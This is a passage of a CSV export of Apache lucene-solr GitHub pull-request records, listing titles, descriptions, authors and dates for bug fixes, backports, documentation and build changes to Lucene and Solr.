Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","tizianodeg","2020-12-09T15:59:29Z","2021-01-12T01:15:10Z"
"","1915","Fix bug in sort optimization (#1903)","Fix bug how iterator with skipping functionality advances and produces docs  Relates to #1725 Backport for #1903","closed","","mayya-sharipova","2020-09-23T14:14:14Z","2020-09-23T14:22:08Z"
"","1903","Fix bug in sort optimization","Fix bug how iterator with skipping functionality advances and produces docs  Relates to #1725","closed","","mayya-sharipova","2020-09-21T20:50:27Z","2020-09-23T13:53:15Z"
"","2424","SOLR-15181: update schema to not specify the docValuesFormat","fix broken test","closed","","thelabdude","2021-02-23T22:40:15Z","2021-02-24T00:34:07Z"
"","1899","Adding dev-docs around the use of Git Worktree.","First attempt, very open to suggestions on making things more clear.","closed","","HoustonPutman","2020-09-21T16:13:12Z","2020-09-30T15:58:15Z"
"","1682","Use FileSystem.newInstance instead of get in HDFSBackupRepository","FileSystem.get can cause FileSystem closed exceptions, especially with S3. Using FileSystem.newInstance should help that case.","closed","","atris","2020-07-20T11:13:15Z","2020-07-25T02:10:12Z"
"","2144","Fix format indent from 4 to 2 spaces","Files in org.apache.lucene.search.comparators package has a wrong indent of 4 spaces instead of 2. This patch fixes only the indent from 4 to correct 2 spaces  Backport for PR: #2129","closed","","mayya-sharipova","2020-12-14T17:18:30Z","2020-12-14T19:00:18Z"
"","2129","Fix format indent from 4 to 2 spaces","Files in org.apache.lucene.search.comparators package has a wrong indent of 4 spaces instead of 2. This patch fixes only the indent from 4 to correct 2 spaces","closed","","mayya-sharipova","2020-12-07T21:40:47Z","2020-12-14T17:19:55Z"
"","2088","LUCENE-9617: Reset lowestUnassignedFieldNumber in FieldNumbers.clear()","FieldNumbers.clear() is called from IndexWriter.deleteAll(), which is supposed to completely reset the state of the index. This includes clearing all known fields.  Prior to this change, it would allocate progressively higher field numbers, which results in larger and  larger arrays for FieldInfos.byNumber, effectively ""leaking"" field numbers every time deleteAll() is called.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  If you run a loop that repeatedly adds documents to an IndexWriter and calls deleteAll, new fields will be given progressively higher index numbers. Since these index numbers are reflected in the size of the FieldInfos.byNumber array, this is effectively a memory leak.  # Solution  Reset lowestUnassignedFieldNumber to -1 when FieldNumbers.clear() is called (resetting the state to that of a newly-created FieldNumbers instance).  # Tests  Added a unit test to confirm that after calling clear(), the next field is given number 0.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","msfroh","2020-11-18T20:27:10Z","2020-12-18T21:30:34Z"
"","2282","LUCENE-9615: Expose HnswGraphBuilder index-time hyperparameters as FieldType attributes","Expose HnswGraphBuilder index-time hyperparameters as FieldType attributes  * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  HnswGraphBuilder has a few tunables: maxConnections, beamWidth, and we may add a few more, such as whether to use a diversity heuristic when choosing neighbors to link in the graph. Currently these are locked to defaults set by global variables. Instead we should provide some interface for configuring them.  # Solution  Here with this change we allow to pass down these parameters as FieldType attributes of VectorFields as well provide a convenience method in VectorFields.java to  add these parameters in FieldType attributes. The value passed in the attributes would be used in `Lucene90VectorWriter ` while creating a HNSW graph, in case no value is found we switch back to default parameter values present in `HnswGraphBuilder`.   # Tests  Updated way of setting these parameters  in `KnnGraphTester.java` for testing indexing and search performance of a knn-graph and added unit tests for new constructor and public method in `VectorField.java` in `TestVectorValues.java`.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","sbeniwal12","2021-02-01T15:51:37Z","2021-02-03T02:05:56Z"
"","2625","Added bulkclose feature to the githubPRs script","Example use:  ```bash ./githubPRs.py \   --bulkclose ""Lucene and Solr development has moved to separate git repositories and this PR is being bulk-closed. Please open a new PR against https://github.com/apache/solr or https://github.com/apache/lucene if your contribution is still relevant to the project."" \   --token XXXXXXXXXXXXX ```  Result of such an action can be seen in #1364 which I used for testing. You can then easily query GitHub for a list of the `stale-closed` PRs: https://github.com/apache/lucene-solr/pulls?q=label%3Astale-closed+is%3Aclosed","open","","janhoy","2021-12-08T10:36:53Z","2021-12-10T10:01:38Z"
"","2188","[Backport] LUCENE-9641: Support for spatial relationships in LatLonPoint (#2155)","Equivalent to LatLonShape, LatLonPoint can be queried now using spatial relationships.  backport #2155","closed","","iverase","2021-01-08T07:46:09Z","2021-01-08T08:20:57Z"
"","1937","LUCENE-9541 ConjunctionDISI sub-iterators check","Ensure sub-iterators of a conjunction iterator don't advance outside of it. Add assertions for checking that all sub-iterators are always on the same document.","closed","","mayya-sharipova","2020-10-01T20:46:29Z","2020-10-05T13:38:22Z"
"","1725","LUCENE-9449 Skip docs with _doc sort and ""after""","Enhance DocComparator to provide an iterator over competitive documents when searching with ""after"" FieldDoc. This iterator can quickly position on the desired ""after"" document, and skip all documents before ""after"" or even whole segments that contain only documents before ""after"".  Related to LUCENE-9280","closed","","mayya-sharipova","2020-08-07T15:49:24Z","2020-09-08T18:16:32Z"
"","1920","branch_8x: add two missing(?) solr/CHANGES.txt entries","Encountered a cherry-pick merge conflict and it seems that these two entries are present in the master branch's solr/CHANGES.txt 8.7 section but (unintentionally?) missing in the branch_8x solr/CHANGES.txt 8.7 section.","closed","","cpoerschke","2020-09-24T16:26:58Z","2021-08-11T17:55:19Z"
"","1985","SOLR-14932: Broken ""Add replica"" button in solr admin UI","Earlier with solr 8.6.x drop down button to check live nodes got broken.","closed","","poke19962008","2020-10-15T06:22:54Z","2020-10-15T19:30:35Z"
"","2085","LUCENE-9508: Fix DocumentsWriter to block threads until unstalled","DWStallControl expects the caller to loop on top of the wait call to make progress with flushing if the DW is stalled. This logic wasn't applied such that DW only stalled for one second and then released the indexing thread. This can cause OOM if for instance during a full flush one DWPT gets stuck and other threads keep on indexing.","closed","","s1monw","2020-11-18T11:55:48Z","2020-11-24T12:05:26Z"
"","1912","LUCENE-9535: Try to do larger flushes.","DWPTPool currently always returns the last DWPT that was added to the pool. By returning the largest DWPT instead, we could try to do larger flushes by finishing DWPTs that are close to being full instead of the last one that was added to the pool, which might be close to being empty.  When indexing wikimediumall, this change did not seem to improve the indexing rate significantly, but it didn't slow things down either and the number of flushes went from 224-226 to 216, about 4% less.  My expectation is that our nightly benchmarks are a best-case scenario for DWPTPool as the same number of threads is dedicated to indexing over time, but in the case when you have e.g. a single fixed threadpool that is responsible for indexing into several indices, the number of indexing threads that contribute to a given index might greatly vary over time.","closed","","jpountz","2020-09-23T10:26:06Z","2021-10-01T10:20:17Z"
"","1925","Cleanup DWPT state handling","DWPT currently has no real notion of a state but it's lifecycle really requires such a notion. We move DWPTs from active to flush pending to flushing and execute certain actions like RAM accounting based on these states. To simplify the transitions and the concurrency involved in it, it makes sense to formalize the transitions and if it can happen under lock or not.","open","","s1monw","2020-09-28T08:32:51Z","2020-09-29T14:00:15Z"
"","2279","Split the publish_maven step in two TODOs","During 8.8 release the RM missed some steps when publishing to maven. Turns out the step `release_maven` is a bit larger than wanted. This PR splits the step in two, one `stage_maven` that stages the artifacts using commands, and another `publish_maven` that is about clicking buttons on the repository.apache.org webpage. I have not tested the steps in bash, but here is the AsciiDoc render of the two steps, which looks good:","closed","","janhoy","2021-02-01T11:40:45Z","2021-02-05T08:58:49Z"
"","1700","Found that asciidoctor 1.5.6.2 cause build-site to fail on long anchors","Documenting need to have ascii doctor version up to date.","closed","","gus-asf","2020-07-27T22:45:50Z","2020-07-28T20:11:24Z"
"","2468","SOLR-15154: Document new options for credentials","Documentation for the client changes introduced in SOLR-15154","closed","","tflobbe","2021-03-10T01:22:16Z","2021-03-12T21:49:56Z"
"","2530","LUCENE-10020 DocComparator don't skip docs of same docID","DocComparator should not skip docs with the same docID on multiple sorts with search after.  Because of the optimization introduced in LUCENE-9449, currently when searching with sort on [_doc, other fields] with search after, DocComparator can efficiently skip all docs before and including the provided [search after docID]. This is a desirable behaviour in a single index search. But in a distributed search, where multiple indices have docs with the same docID, and when searching on [_doc, other fields], the sort optimization should NOT skip documents with the same docIDs.  This PR fixes this.  Backport for https://github.com/apache/lucene/pull/204 Relates to LUCENE-9449","closed","","mayya-sharipova","2021-07-07T00:27:02Z","2021-07-07T00:30:07Z"
"","2009","SOLR-14954: Heavily edit reindexing.adoc","Doc changes the reindexing page emphasizing reindexing is encouraged.","closed","","ErickErickson","2020-10-20T15:42:41Z","2020-10-25T16:00:39Z"
"","1756","SOLR-14750: Invoke core reload with core id to avoid multiple reloads","Do not commit, tests are still failing . See [SOLR-14750](https://issues.apache.org/jira/browse/SOLR-14750) for discussion","closed","test-fix,","noblepaul","2020-08-17T00:56:39Z","2020-08-23T09:35:32Z"
"","2075","LUCENE-9599 Disable sort optim on index sort","Disable sort optimization in comparators on index sort.  Currently, if search sort is equal or a part of the index sort, we have an early termination in TopFieldCollector. But comparators are not aware of the index sort, and may run sort optimization even if the search sort is congruent with the index sort.  This patch: - make leaf comparators aware that search sort is congruent with the index sort. - disables sort optimization in comparators in this case. - removes a private  MultiComparatorLeafCollector class as the only class that extended that class was TopFieldLeafCollector that now incorporates the logic of the deleted class.  Relates to #1351","closed","","mayya-sharipova","2020-11-10T22:02:44Z","2020-12-03T17:08:53Z"
"","2117","LUCENE-9599 Disable sort optim on index sort","Disable sort optimization in comparators on index sort.  Currently, if search sort is equal or a part of the index sort, we have an early termination in TopFieldCollector. But comparators are not aware of the index sort, and may run sort optimization even if the search sort is congruent with the index sort.  This patch: - adds `disableSkipping` method to `FieldComparator`, This method is called by `TopFieldCollector`, when the search sort is congruent with the index sort. It is also called when we can't use points for sort optimization. - disables sort optimization in comparators in these cases.  Relates to #1351 Backport for #2075","closed","","mayya-sharipova","2020-12-03T20:15:14Z","2020-12-04T13:31:11Z"
"","2094","LUCENE-9047: Move the Directory APIs to be little endian","Directory API is now little endian. Note that codecs still work on Big endian for backwards compatibility, therefore they reverse the bytes whenever they are writing / reading short, ints and longs.  CodecUtils for header and footers has been modified to be little Indian. Still the version and checksum will be written / read reversing bytes for backwards compatibility.  SegmentInfos is read / written in little endian, for previous version, the IndexInput is wrapped for backwards compatibility.","closed","","iverase","2020-11-23T11:09:13Z","2021-04-26T09:00:50Z"
"","1674","LUCENE-9430: Explainable ConstantScoreQuery","Developer cannot check the result of detailed explain with ConstantScoreQuery.  If the developer want to check it, then must be change the query.     The result is the same as ConstantScoreQuery,  but if you can check the detailed explain, it will help in development and debug.","open","","jeng832","2020-07-15T16:39:37Z","2020-08-28T12:38:23Z"
"","2373","SOLR-15130: Allow per-collection replica placement node sets","Details in Jira.  This branch is based on `jira/solr-15131` so that it uses collection properties for node type settings.","closed","","sigram","2021-02-15T17:09:19Z","2021-02-23T22:08:08Z"
"","2660","SOLR-16209 Improve PKIAuthenticationPlugin Logging","Depends on #2641 will commit both at the same time","closed","","madrob","2022-05-20T21:40:31Z","2022-05-31T16:11:06Z"
"","1905","LUCENE-9488 Release with Gradle Part 2","Deleted lucene/version.properties again","closed","","madrob","2020-09-21T23:13:43Z","2020-10-08T20:08:13Z"
"","2200","LUCENE-9661: Fix deadlock in TermsEnum.EMPTY","Deadlocks can occur if the constructor part of BaseTermsEnum is executed during initializing of TermsEnum. It can be reproduced by revert the code of TermsEnum class and running TestTermsEnumDeadlock#testDeadlock.  This PR will be cherry-picked to the master, 8x and 8.8 branch.  Issue link: https://issues.apache.org/jira/browse/LUCENE-9661","closed","","danmuzi","2021-01-13T15:31:21Z","2021-01-15T21:49:24Z"
"","2473","LUCENE-9507 Custom order for leaves","Custom order for leaves in IndexReader and IndexWriter  1.Add an option to supply a custom leaf sorter for IndexWriter. A DirectoryReader opened from this IndexWriter will have its leaf readers sorted with the provided leaf sorter. This is useful for indices on which it is expected to run many queries with particular sort criteria (e.g. for time-based indices this is usually a descending sort on timestamp). Providing leafSorter allows to speed up early termination for this particular type of sort queries.  2. Add an option to supply a custom sub-readers sorter for BaseCompositeReader. In this case sub-readers will be sorted according to the the provided leafSorter.  3. Add an option to supply a custom leaf sorter for StandardDirectoryReader. The leaf readers of this StandardDirectoryReader will be sorted according to the the provided leaf sorter.  Backport for https://github.com/apache/lucene/pull/32","closed","","mayya-sharipova","2021-03-29T18:30:51Z","2021-03-30T13:11:13Z"
"","2063","LUCENE-9599 Make comparator aware of index sorting","Currently, if search sort is equal to index sort,  we have an early termination in TopFieldCollector. As we work to enhance comparators to provide skipping functionality (PR #1351), we would like to move this termination functionality on index sort from TopFieldCollector to comparators.  This patch does the following: - Add method usesIndexSort to LeafFieldComparator - Make numeric comparators aware of index sort and early terminate on   collecting all competitive hits - Move TermValComparator and TermOrdValComparator from FieldComparator   to comparator package, for all comparators to be in the same package - Enhance TermOrdValComparator to provide skipping functionality when   index is sorted  One item left for TODO for a following PR is to remove the logic of early termination from TopFieldCollector. We can do that once we ensure that all BulkScorers are using iterators from collectors that can skip non-competitive docs.  Relates to #1351","closed","","mayya-sharipova","2020-11-04T20:31:58Z","2020-11-10T22:06:06Z"
"","2047","LUCENE-9592: Use doubles in VectorUtil to maintain precision.","Currently we use floats throughout the vector computations like dot product. This PR switches to doubles to avoid a loss of precision.","closed","","jtibshirani","2020-10-30T00:03:50Z","2020-11-17T18:08:41Z"
"","1918","LUCENE-9535: Commit DWPT bytes used before locking indexing","Currently we calcualte the ramBytesUsed by the DWPT under the flushControl lock. We can do this caculation safely outside of the lock without any downside. The FlushControl lock should be used with care since it's a central part of indexing and might block all indexing.","closed","","s1monw","2020-09-23T18:39:21Z","2020-09-24T07:39:34Z"
"","2214","LUCENE-9674:Faster advance on Vector Values","Currently the advance() function in the class Lucene90VectorReader does a linear search for the target document. This will make retrieving vectors for a sparse set of documents efficient.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Currently the advance() function in the class Lucene90VectorReader does a linear search for the target document. This can be an expensive operation if we are searching for sparse documents having vector fields.  # Solution  Implement a binary search over the ""ordToDoc"" array which will make the advance operation take logarithmic time to search.  # Tests  Added testAdvance() in class TestVectorValues. It creates an index with gaps for vector fields and randomly calls advance.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","codaitya","2021-01-18T10:44:03Z","2021-01-21T15:02:22Z"
"","1705","factor out static LTRQParserPlugin.newLTRScoringQuery(...) method","Currently the `ltr` parser takes a single `model` argument from which an `LTRScoringQuery` object is created.  If the parser needs to construct multiple `LTRScoringQuery` objects -- e.g. like in #1571 for https://issues.apache.org/jira/browse/SOLR-14560 -- then a utility method for constructing a single `LTRScoringQuery` object could be helpful.  Note that the proposed utility method does not know about the argument name i.e. multiple `LTRScoringQuery` objects could correspond to * multiple `model` arguments, or * one `original_model` argument plus one or more `model` arguments, or * some other combination of argument names.","closed","","cpoerschke","2020-07-29T17:06:30Z","2020-12-15T18:04:28Z"
"","2409","Revert LUCENE-9491 changes for profiling.gradle, they totally break functionality","currently in master `tests.profile` gives totally broken output. Reverting the last changes to `profiling.gradle` gets it working again","closed","","rmuir","2021-02-21T13:58:15Z","2021-02-23T04:46:01Z"
"","1835","LUCENE-9509: Refine lucene/BUILD.md and top-level README (for newdevs)","Current lucene/BUILD.md is somehow mixed-up with information for Solr developers, this is wrong place for them. Solr related information/tips should be moved to the top-level README (or somewhere else).  Also the content could be elaborated for newdevs (required JDK version, and so on).","closed","","mocobeta","2020-09-06T10:52:05Z","2020-09-07T10:08:39Z"
"","2445","SOLR-15154: Let Http2SolrClient pass Basic Auth credentials to all requests","Credentials can now be set explicitly at the client level, or can be read from System properties like in the previous version of the client when using `PreemptiveBasicAuthClientBuilderFactory`. Other implementations of `HttpClientBuilderFactory` can now also be used.  This test also adds a small refactor to `PreemptiveBasicAuthClientBuilderFactory` for better testing.","closed","","tflobbe","2021-03-03T01:20:02Z","2021-03-05T18:51:26Z"
"","2572","SOLR-15555","Create a new cache mode for CaffeineCache where we can optionally use an async cache instead of the synchronous implementation. This is useful for cases (esp FilterQuery) where many identical requests come in near the same time and they would otherwise race to fill the same cache slot.  CaffeineCache computeIfAbsent now accepts an IOFunction instead of the non-throwing java.util.Function interface.  This required an update to CaffeineCache 2.9, which updates putIfAbsent with an optimistic get.  Also incidentally fixes a rare bug where cache ramBytesUsed would be incorrectly reported under heavy cache contention/eviction loads.  Based on c942c7242c2fb9f45b21675f5895835412ecaf7a","closed","","madrob","2021-09-14T14:09:54Z","2021-09-14T18:33:49Z"
"","2122","SOLR-14950: Fix copyfield regeneration with explicit src/dest matching dyn rule","CopyFields are regenerated in case of replace-field or replace-field-type. While regenerating, source and destination are checked against fields but source/dest could match dynamic rule too. For example,   here, something_s is not present in schema but matches the dynamic rule.  To handle the above case, need to check dynamicFieldCache too while regenerating the copyFields","closed","","munendrasn","2020-12-05T06:32:28Z","2021-01-07T16:36:42Z"
"","1805","SOLR-14540: example of drill sideway block join facets","Contributing example of block join drill-seideway facets to Ref Guide","closed","","mkhludnev","2020-08-30T16:53:52Z","2021-08-12T20:30:29Z"
"","1889","LUCENE-9534: Ensure DWPT#ramBytesUsed is only called unter lock","Consumers of the used RAM of a DWPT should use it's committed bytesUsed value that's threadsafe.","closed","","s1monw","2020-09-18T15:44:28Z","2020-09-18T15:59:09Z"
"","2263","SOLR-14978 OOM Killer in Foreground (#2055)","Combine Docker and bin/solr OOM handling scripts, move OOM handling to foreground Solr as well.  Co-authored-by: Houston Putman","closed","","madrob","2021-01-28T17:26:04Z","2021-05-25T19:38:24Z"
"","2500","SOLR-14978 OOM Killer in Foreground","Co-authored-by: Houston Putman","closed","","madrob","2021-05-25T19:53:50Z","2021-06-01T15:18:38Z"
"","2110","SOLR-15004: tests for the replica placement API + placement plugin fixes and light refactoring","Co-authored-by: Andrzej Bialecki","closed","","murblanc","2020-12-01T10:34:00Z","2020-12-01T21:02:00Z"
"","1680","LUCENE-9433: Remove Ant support from trunk","Checkpoint for discussion","closed","","ErickErickson","2020-07-18T17:28:43Z","2020-07-20T23:13:15Z"
"","1734","LUCENE-9453 Add sync around volatile write","checkoutAndBlock is not synchronized, but has a non-atomic write to numPending. Meanwhile, all of the other writes to numPending are in sync methods.  In this case it turns out to be ok because all of the code paths calling this method are already sync:  `synchronized doAfterDocument -> checkout -> checkoutAndBlock` `checkoutLargestNonPendingWriter -> synchronized(this) -> checkout -> checkoutAndBlock`  If we make synchronized checkoutAndBlock that protects us against future changes, shouldn't cause any performance impact since the code paths will already be going through a sync block, and will make an IntelliJ warning go away.  Found via IntelliJ warnings.   https://issues.apache.org/jira/browse/LUCENE-9453","closed","","madrob","2020-08-10T22:49:15Z","2020-08-11T15:42:03Z"
"","2665","LUCENE-10470: [Tessellator] Fix some failing polygons due to collinear edges (#756)","Check if polygon has been successfully tessellated before we fail (we are failing some valid tessellations) and allow filtering edges that fold on top of the previous one.  backport of https://github.com/apache/lucene/pull/756","closed","","iverase","2022-07-01T08:35:04Z","2022-07-01T08:51:14Z"
"","1717","Updating jenkins links to the new cluster.","Changing from builds.apache.org to ci-builds.apache.org","closed","","HoustonPutman","2020-08-05T15:59:41Z","2021-10-09T15:16:32Z"
"","2078","SOLR-14986: Add warning to ref guide that using properties.name is an…","Changed both CREATE and ADDREPLICA to just add the warning to the docs. The JIRA has a long explanation about why fixing it in the code is too risky/expensive.  gw buildsite succeeds.  I'll commmit this over the weekend absent objections.","closed","","ErickErickson","2020-11-12T14:27:46Z","2020-11-14T13:57:28Z"
"","1740","LUCENE-9458: WDGF and WDF should tie-break by endOffset","Can happen with catenateAll and not generating word xor number part when the input ends with the non-generated sub-token.  https://issues.apache.org/jira/browse/LUCENE-9458  CC @jimczi maybe you could review this please; I believe you reviewed the predecessor.","closed","","dsmiley","2020-08-11T21:45:00Z","2020-10-02T02:27:55Z"
"","1910","Use github actions cache","Cache our gradle downloads when dependancies haven't changed","closed","","madrob","2020-09-22T15:27:53Z","2020-09-22T18:08:25Z"
"","1949","Jinja2_autoescape_false set to True","By default, jinja2 sets autoescape to False. Consider using autoescape=True to mitigate XSS vulnerabilities.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","JohnHillegass","2020-10-05T21:28:27Z","2021-06-29T00:36:02Z"
"","1850","LUCENE-9517: Don't subclass Deflater and instead create a patch for setDictionary() using a functional interface","Bugfix for LUCENE-9517: Instead of subclassing Deflater like in LUCENE-9500, we just provide a method reference (using a functional interface), so code can call Deflater#setDictionary.  The issue was caused by a missing AccessController#setPrivileged() in JDK's code when Deflater was subclassed. This workaround does not subclass, so the missing doPrivileged is not needed.  This also adds the faulty methods to forbiddenapis.","closed","","uschindler","2020-09-09T16:20:29Z","2020-09-14T16:11:43Z"
"","1748","LUCENE-9447: Increase block sizes for stored fields.","BEST_SPEED and BEST_COMPRESSION keep the same compression algorithms but increase their respective block sizes from 16kB and 60kB to 64kB and 256kB.  I disabled the per-thread caching of buffers, which could likely become memory hogs with these greater block sizes.","closed","","jpountz","2020-08-13T14:48:27Z","2020-08-26T08:19:49Z"
"","2098","SOLR-14851 Http2SolrClient doesn't handle keystore type","Based on patch by Andras Salamon in https://issues.apache.org/jira/browse/SOLR-14851  Signed-off-by: Jan Høydahl    # Description  Make truststore and keystore type configurable in Http2SolrClient   # Tests  Extended the existing test case","closed","","janhoy","2020-11-26T13:28:06Z","2020-11-27T15:11:35Z"
"","2511","LUCENE-9976: Fix WANDScorer assertion error","Backports changes from https://github.com/apache/lucene/pull/171 into branch_8_9","closed","","zacharymorn","2021-06-10T04:46:06Z","2021-06-10T07:25:59Z"
"","2512","LUCENE-9976: Fix WANDScorer assertion error","Backports changes from apache/lucene#171 into branch_8x","closed","","zacharymorn","2021-06-10T04:57:25Z","2021-06-10T07:25:40Z"
"","2542","LUCENE-10030: Lazily evaluate score in DrillSidewaysScorer.doQueryFirstScoring","Backporting LUCENE-10030","closed","","gsmiller","2021-08-01T18:59:12Z","2021-08-01T20:58:28Z"
"","2516","Backport LUCENE-9902 Minor fixes to the faceting API (#62)","Backported from the original [PR](https://github.com/apache/lucene/pull/62) in apache/lucene","closed","","gautamworah96","2021-06-23T19:44:58Z","2021-06-23T20:31:17Z"
"","2527","SOLR-15208: Add the countDist aggregation to the stats, facet and timeseries Streaming Expressions","Backport to branch_8x","closed","","thelabdude","2021-07-06T20:09:55Z","2021-07-06T20:10:22Z"
"","2515","SOLR-15472: New shards.preference option for preferring replicas based on their leader status","Backport to 8x, see original PR: https://github.com/apache/solr/pull/188","closed","","thelabdude","2021-06-23T18:48:12Z","2021-06-24T14:25:08Z"
"","2532","SOLR-15525: Read ZK credentials from a file specified using a system property instead of exposing plain-text credentials","backport to 8x","closed","","thelabdude","2021-07-16T15:48:35Z","2021-07-16T16:35:19Z"
"","2654","LUCENE-10481","Backport to 8.11.2","closed","","madrob","2022-05-12T17:16:11Z","2022-05-16T17:42:37Z"
"","2492","SOLR-15397 Expose zookeeper status in the exporter","Backport of https://issues.apache.org/jira/browse/SOLR-15397","closed","","janhoy","2021-05-12T08:56:03Z","2021-05-12T09:28:11Z"
"","2346","SOLR-15145: System property to control whether base_url is stored in state.json to enable back-compat with older SolrJ versions","backport of https://issues.apache.org/jira/browse/SOLR-15145 to 8.8 branch","closed","","thelabdude","2021-02-10T16:40:38Z","2021-02-11T17:24:10Z"
"","2659","SOLR-16199: Fix query syntax for LIKE queries with wildcard","Backport of https://github.com/apache/solr/pull/870","closed","","kiranchitturi","2022-05-19T18:27:58Z","2022-05-19T21:58:46Z"
"","2657","SOLR-16199: Fix query syntax for LIKE queries with wildcard","Backport of https://github.com/apache/solr/pull/865","closed","","thelabdude","2022-05-17T18:53:58Z","2022-05-19T19:53:12Z"
"","2639","SOLR-15587: Don't use the UrlScheme singleton on the client-side","Backport of https://github.com/apache/solr/pull/600 to 8_11 branch  Still need to test the following scenarios:  - [x] 1. Rolling upgrade from pre-8.8 multi-node cluster to 8.11 (from this branch) - [x] 2. Rolling upgrade from 8.8.1 multi-node cluster with `solr.storeBaseUrl=false` to 8.11 (from this branch) - [x] 3. Rolling upgrade from 8.8.1 multi-node cluster with `solr.storeBaseUrl=true` to 8.11 (from this branch) - [x] 4. SolrJ client running 8.7 to cluster built with this branch - [x] 5. SolrJ client running 8.11.1 to cluster built with this branch","closed","","thelabdude","2022-02-07T18:20:57Z","2022-02-08T00:34:13Z"
"","2626","SOLR-15832: Clean-up after publish action in Schema Designer shouldn't fail if .system collection doesn't exist","backport of https://github.com/apache/solr/pull/451","closed","","thelabdude","2021-12-08T20:27:21Z","2021-12-09T00:01:40Z"
"","2623","SOLR-15199: Pass thru all command actions not explicitly handled by the bin/solr script, such as 'api', to the SolrCLI Java app","backport of https://github.com/apache/solr/pull/441","closed","","thelabdude","2021-12-03T17:15:01Z","2021-12-03T17:15:30Z"
"","2621","SOLR-15828: AuthTool (in SolrCLI) should include the config-read, collection-admin-read, core-admin-read, and all permissions in the initial security.json","backport of https://github.com/apache/solr/pull/438","closed","","thelabdude","2021-12-02T19:06:37Z","2021-12-02T19:30:52Z"
"","2620","SOLR-15825: Security UI 'hasPermission' check should check if the user has the all permission if the requested permission is not defined","backport of https://github.com/apache/solr/pull/437","closed","","thelabdude","2021-12-02T16:09:24Z","2021-12-02T16:09:54Z"
"","2618","SOLR-15813: Schema designer not handling  stored as a string (vs. boolean) in the config overlay","backport of https://github.com/apache/solr/pull/435","closed","","thelabdude","2021-11-30T18:09:25Z","2021-11-30T18:17:36Z"
"","2617","SOLR-13900: Reset index values on authorization rules after deleting by index","Backport of https://github.com/apache/solr/pull/434","closed","","thelabdude","2021-11-30T15:54:58Z","2021-12-01T22:51:00Z"
"","2538","SOLR-15277: Schema Designer screen for Admin UI and supporting backend API","backport of https://github.com/apache/solr/pull/42","closed","","thelabdude","2021-07-29T19:24:21Z","2021-07-30T16:34:59Z"
"","2613","SOLR-15774: Avoid weird off-by-one errors with Angular's 'chosen' select box directive for the security and schema-designer screens in Admin UI","backport of https://github.com/apache/solr/pull/404","closed","","thelabdude","2021-11-18T21:59:22Z","2021-11-18T22:25:36Z"
"","2601","SOLR-15766: MultiAuthPlugin should send non-AJAX anonymous requests to the plugin that allows anonymous requests","backport of https://github.com/apache/solr/pull/394","closed","","thelabdude","2021-11-03T18:41:29Z","2021-11-03T19:25:00Z"
"","2599","SOLR-15721: Support editing Basic auth config when using the MultiAuthPlugin","backport of https://github.com/apache/solr/pull/393","closed","","thelabdude","2021-11-03T16:24:43Z","2021-11-03T16:35:02Z"
"","2598","SOLR-12666: Add authn & authz plugins that supports multiple authentication schemes, such as Bearer and Basic","backport of https://github.com/apache/solr/pull/355","closed","","thelabdude","2021-11-01T22:21:31Z","2021-11-01T22:36:04Z"
"","2585","SOLR-15665: Move polling logic under main","Backport of https://github.com/apache/solr/pull/318 to 8x","closed","","thelabdude","2021-09-29T16:03:42Z","2021-09-29T16:14:29Z"
"","2580","SOLR-15637: Set scope.tls for security UI based on data.security.tls in response from server","backport of https://github.com/apache/solr/pull/299","closed","","thelabdude","2021-09-21T19:16:23Z","2021-09-21T19:50:44Z"
